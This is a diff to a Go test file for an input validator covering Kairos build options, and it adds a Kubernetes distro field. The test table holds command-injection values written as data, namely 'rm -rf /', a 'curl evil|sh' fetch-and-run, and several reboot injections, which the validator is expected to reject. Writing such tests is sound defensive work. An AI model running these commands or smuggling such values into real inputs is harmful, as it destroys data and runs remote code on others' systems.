@@ -59,7 +59,7 @@ func TestValidateKairosInitValue(t *testing.T) {
 }
 
 // TestValidateKairosInitOptions confirms optional fields are only validated
-// when set, and that a tainted value in any of the three fields is rejected.
+// when set, and that a tainted value in any interpolated field is rejected.
 func TestValidateKairosInitOptions(t *testing.T) {
 	t.Parallel()
 
@@ -72,6 +72,7 @@ func TestValidateKairosInitOptions(t *testing.T) {
 	ok := builder.BuildOptions{
 		Model:             "generic",
 		KairosVersion:     "v3.2.1",
+		KubernetesDistro:  "k3s",
 		KubernetesVersion: "v1.30.0+k3s1",
 	}
 	if err := validateKairosInitOptions(ok); err != nil {
@@ -81,6 +82,7 @@ func TestValidateKairosInitOptions(t *testing.T) {
 	cases := map[string]builder.BuildOptions{
 		"model":              {Model: "generic; rm -rf /"},
 		"kairos version":     {KairosVersion: "latest && curl evil|sh"},
+		"kubernetes distro":  {KubernetesDistro: "k3s; reboot"},
 		"kubernetes version": {KubernetesVersion: "v1.30$(reboot)"},
 	}
 	for field, opts := range cases {
